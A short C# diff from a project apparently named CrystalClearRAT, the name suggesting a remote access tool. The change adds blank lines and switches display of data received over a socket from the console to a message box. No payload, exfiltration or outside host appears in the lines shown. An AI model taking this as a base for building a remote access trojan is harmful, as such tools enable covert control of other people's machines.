@@ -59,6 +59,8 @@ namespace CrystalClearRAT.Web
 
         }
 
+      
+
         private static void Receive(Socket fromSocket)
         {
             byte bufLength = 4;
@@ -103,7 +105,7 @@ namespace CrystalClearRAT.Web
             ms.Dispose();
 
 
-            Console.WriteLine(System.Text.Encoding.UTF8.GetString(data));
+            System.Windows.MessageBox.Show((System.Text.Encoding.UTF8.GetString(data)));
 
             Receive(state.Socket);
 
